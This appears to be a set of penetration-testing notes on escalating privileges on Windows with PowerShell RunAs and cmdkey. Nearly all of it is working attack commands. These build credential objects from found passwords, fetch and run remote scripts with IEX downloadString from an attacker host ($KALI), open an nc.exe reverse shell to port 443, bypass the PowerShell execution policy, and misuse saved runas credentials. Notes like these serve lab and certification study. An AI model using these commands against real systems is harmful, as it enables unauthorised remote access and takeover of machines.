####  RunAs via PowerShell (Requires creds)
**Method1**
Attempting to re-use a found password with the Administrator account can be achieved using PowerShell:

![[Pasted image 20220926193742.png]]

```Powershell - target
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)
```

will store the credentials in `$creds` for the session. 

A reverse shell can now be opened with the supplied credentials using the command:

[[Python#Server]]

[[rlwrap]]

```powershell
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://$KALI/Shelly.ps1')" -Credential $creds
```

**Method2**


Say we already have Alice's (Local Admin member) password, we can execute cmd as her.

[[rlwrap]]

```powershell - target
echo $username = 'alice' > startprocess.ps1
```

```powershell - target
echo $password = '$PASSWORD' >> startprocess.ps1
```

```powershell - target
echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> startprocess.ps1
```

```powershell - target
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
```

Transfer over nc.exe
```bash - kali
cp /usr/share/windows-resources/binaries/nc.exe .
```

[[Python#Server]]

[[4._File Transfers]]

```
echo $KALI
```

==REPLACE $KALI WITH YOUR IP!==
```command prompt - target
echo Start-Process 'C:\Users\$USER\AppData\Local\Temp\nc.exe' -ArgumentList '-e C:\Windows\System32\cmd.exe $KALI 443' -Credential $credential >> startprocess.ps1
```

```command prompt - target
powershell.exe Get-ExecutionPolicy -Scope CurrentUser
```

```command prompt - target
powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

```command prompt - target
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess.ps1
```

#### RunAs via cmdkey
```command prompt - windows
cmdkey /list
```

![[Pasted image 20220206132243.png]]

![[1._Reverse Shells (WIN)#Invoke-Powershell ps1]]

![[Python#Server]]

![[rlwrap]]

```command prompt - target
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://$KALI/Invoke-PowerShellTcp.ps1')"
```

